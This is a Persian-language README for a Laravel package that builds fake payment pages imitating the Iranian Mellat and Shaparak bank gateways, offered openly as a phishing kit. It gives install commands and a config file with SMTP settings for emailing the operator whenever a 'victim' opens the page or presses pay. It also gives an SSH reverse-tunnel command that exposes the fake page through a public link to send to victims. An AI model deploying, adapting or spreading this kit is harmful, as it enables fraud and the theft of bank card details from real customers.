
# فیک پیج ساز بانک های ایران

نسخه اولیه فیک پیج ساز بانک های ایران(درگاه های شاپرک و ملت) 

ساخته شده توسط یکی از بچه های کلاس لاراول استاد علی رحمانیان

جهت ارتباط با استاد رحمانیان به سایت زیر مراجعه  کنید

http://alirahmanian.com

https://www.instagram.com/ali.rahmanian.s.a

## امکانات

- پشتیبانی از دو درگاه پرداخت ملت و شاپرک
- ارسال ایمیل هنگام ورود قربانی و کلیک قربانی بر روی دکمه پرداخت
- امکان ویرایش اطلاعات پذیرنده درگاه پرداخت
- بدون نیاز به هاست 



## نحوه استفاده از پکیج

جهت استفاده از طریق کامپوزر اقدام به دانلود کنید

```bash
  composer require laravelclass/bank-fake-page
```
بعد از تمامی کلاس ها رجیستر کنید providers در قسمت app.php بروید و در فایل config به مسیر
```bash
  \LaravelClass\BankFakePage\Providers\FakePageProvider::class
```


با دستور زیر پکیج اقدام به پابلیش فایل تنظیمات میکند و سرور را ران میکند



```bash
  php artisan fake-page:rocket
```

در مسیر config یک فایل به نام fakePage.php قرار دارد.میتوانید تنظیمات خود را اعمال کنید


## fakePage.php محتوای فایل

```php
<?php
return [
    'providerName'=> 'نام تستی پذیرنده',
    'providerNumber'=>'شماره پذیرنده',
    'terminalNumber' => 'شماره ترمینال',
    'websiteUrl' => 'ادرس وبسایت پذیرنده',
    'price' => 'قیمت محصول',
    'fakePage' => 'نام درگاه قابل نمایش' ==> mellat or shaparak,
    'tunnelUrl' => 'لینک پورت فوروارد قربانی',
    'emailForAlert' => 'ایمیل جهت طلاع وضعیت قربانی',
    'MAIL_HOST' => 'smtp.googlemail.com',
    'MAIL_PORT' => 465,
    'MAIL_USERNAME' => 'یک ایمیل برای فرستادن اطلاعات',
    'MAIL_PASSWORD' => 'پسورد ایمیل',
    'MAIL_ENCRYPTION' => 'ssl',
    'MAIL_FROM_ADDRESS' => 'laravelclass@laravel.com',
    'MAIL_FROM_NAME' => 'LaravelClass'
];

```


## نحوه گرفتن لینک

شما میتوانید با استفاده از دستور زیر یک لینک دریافت کنید که به لوکال هاست شما فوروارد میکند.توجه کنید که این لینک امن بوده و خطری شما را تهدید نمیکند

```bash
  ssh -R 80:127.0.0.1:8000 nokey@localhost.run
```

پس از زدن این دستور اگر برای اولین بار زده باشید از شما تاییدیه انتقال کلید را میخواهد که تایید کنید.پس از آن یک لینک در اختیار شما قرار میگیرد که باید ابتدا در 
  در مسیر فایل کانفینگ پروژه بروید و معرفی کنید. fakePage.php فایل


## نمونه دستور خروجی و نمایش لینک

```
34c2ea123974dd48665.lhrtunnel.link tunneled with tls termination, https://34c2ea123974dd48665.lhrtunnel.link

```
https://34c2ea123974dd48665.lhrtunnel.link در نمونه خروجی بالا لینک برای معرفی به تنظیمات و قربانی
